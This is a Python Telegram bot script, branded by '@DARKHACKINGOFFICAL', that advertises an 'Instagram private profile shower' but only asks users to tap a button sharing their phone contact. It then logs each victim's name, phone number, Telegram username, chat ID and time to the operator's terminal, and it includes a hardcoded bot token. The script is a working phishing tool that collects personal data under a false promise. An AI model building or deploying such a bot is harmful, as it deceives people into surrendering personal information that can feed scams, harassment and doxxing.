import telebot
from datetime import datetime
import pytz
import threading
import time
import os

# === BOT TOKEN ===
BOT_TOKEN = "7729772878:AAElbpzU7bw0xd0Bl1ANquHZtY6lZq-bMN0"  # ✅ Replace with your actual bot token
bot = telebot.TeleBot(BOT_TOKEN)

# === SHARED VARIABLES ===
print_lock = threading.Lock()
contact_logs = []  # List to store all contact logs received through @DARKHACKINGOFFICAL's bot

# === START COMMAND ===
@bot.message_handler(commands=['start'])
def welcome(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    button = telebot.types.KeyboardButton(text="📱 PRIVATE PROFILE SHOW", request_contact=True)
    markup.add(button)
    bot.send_message(
        message.chat.id,
        "👋 *Welcome to 卄卂尺ち卄 ᏰᎻᎯí࿐ -INSTAGRAM PRIVATE PROFILE SHOWER*\n"
        "Powered by: @DARKHACKINGOFFICAL\n\n"
        "👉 Tap below to INSTAGRAM PRIVATE PROFILE SHOWER with 卄卂尺ち卄 ᏰᎻᎯí࿐.",
        parse_mode="Markdown",
        reply_markup=markup
    )

# === CONTACT HANDLER ===
@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    contact = message.contact
    india_time = datetime.now(pytz.timezone("Asia/Kolkata"))
    weekday = india_time.strftime("%A")
    time_str = india_time.strftime("%I:%M %p")

    from_user = message.from_user
    tg_username = f"@{from_user.username}" if from_user.username else "❌ Not Available"
    chat_id = from_user.id
    first_name = from_user.first_name or "❓ Unknown"
    phone_number = contact.phone_number or "❓ Unknown"

    log = (
        f"\n📥 New Contact Received by @DARKHACKINGOFFICAL:\n"
        f"👤 Name     : {first_name}\n"
        f"📱 Phone    : {phone_number}\n"
        f"🔗 Username : {tg_username}\n"
        f"🆔 Chat ID  : {chat_id}\n"
        f"📅 Day      : {weekday}\n"
        f"🕒 Time     : {time_str}\n"
        f"📢 Powered by 卄卂尺ち卄 ᏰᎻᎯí࿐ | @DARKHACKINGOFFICAL\n"
        + "-" * 50
    )

    with print_lock:
        contact_logs.append(log)

    bot.send_message(message.chat.id, "✅ DARK successfully by *卄卂尺ち卄 ᏰᎻᎯí࿐*!", parse_mode="Markdown")

# === CLEAR TERMINAL FUNCTION ===
def clear():
    os.system("clear" if os.name == "posix" else "cls")

# === ANIMATION + LOG DISPLAY FUNCTION ===
def animate_running():
    frames = ["[■□□□□]", "[■■□□□]", "[■■■□□]", "[■■■■□]", "[■■■■■]", "[□■■■■]", "[□□■■■]", "[□□□■■]", "[□□□□■]"]
    while True:
        for frame in frames:
            with print_lock:
                clear()
                print("\033[1;31m" + "=" * 60 + "\033[0m")
                print("\033[1;31m{:^60}\033[0m".format("✨ 卄卂尺ち卄 ᏰᎻᎯí࿐ | @DARKHACKINGOFFICAL"))
                print("\n\033[1;32m{:^60}\033[0m\n".format(f"🤖 Bot Running {frame}"))
                print("\033[1;31m" + "=" * 60 + "\033[0m")

                # Show last 3 contacts
                print("\n\033[1;36m📬 Recent Contacts (Logged by @DARKHACKINGOFFICAL):\033[0m")
                for log in contact_logs[-3:]:
                    print(log)
            time.sleep(0.4)

# === START BACKGROUND ANIMATION THREAD ===
animation_thread = threading.Thread(target=animate_running)
animation_thread.daemon = True
animation_thread.start()

# === START BOT POLLING ===
print("🔧 Bot started by 卄卂尺ち卄 ᏰᎻᎯí࿐ | Developer: @DARKHACKINGOFFICAL")
bot.polling()